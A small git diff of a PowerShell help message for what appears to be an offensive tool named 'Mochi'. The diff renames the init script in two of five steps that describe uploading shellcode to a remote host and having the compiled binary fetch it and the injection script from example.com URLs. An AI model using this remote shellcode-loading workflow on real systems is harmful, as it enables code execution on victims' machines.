@@ -13,9 +13,9 @@ if ($help.IsPresent) {
     Write-Host "inject.chai Script Init Steps"
     Write-Host "=============================`n"
     Write-Host "Step 1: Upload your shellcode payload to a remote location."
-    Write-Host "Step 2: From the root directory of the project, execute:`n`n.\helper_scripts\init_chaiscript_inject_module.ps1 -payloadUrl `"https://example.com/shellcode.bin`"`n"
+    Write-Host "Step 2: From the root directory of the project, execute:`n`n.\helper_scripts\chaiscript_inject_module_init.ps1 -payloadUrl `"https://example.com/shellcode.bin`"`n"
     Write-Host "Step 3: Upload the modified inject.chai file to a remote location."
-    Write-Host "Step 4: From the root directory of the project, execute:`n`n.\helper_scripts\init_chaiscript_inject_module.ps1 -scriptUrl `"https://example.com/inject.chai`"`n"
+    Write-Host "Step 4: From the root directory of the project, execute:`n`n.\helper_scripts\chaiscript_inject_module_init.ps1 -scriptUrl `"https://example.com/inject.chai`"`n"
     Write-Host "Step 5: Compile Mochi in the Visual Studio project and execute binary to validate successful init.`n"
 }
 
